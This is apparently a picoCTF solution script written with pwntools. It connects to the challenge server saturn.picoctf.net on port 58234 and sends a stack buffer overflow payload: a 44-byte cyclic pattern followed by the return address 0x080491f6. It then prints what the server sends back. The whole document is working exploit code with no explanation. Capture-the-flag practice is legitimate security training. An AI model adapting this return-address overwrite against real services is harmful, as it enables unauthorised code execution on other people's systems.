from pwn import *

add = ('saturn.picoctf.net')
soc = remote(add, 58234)

payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab\xf6\x91\x04\x08"

soc.sendline(payload)

print((soc.recvline()))
print((soc.recv()))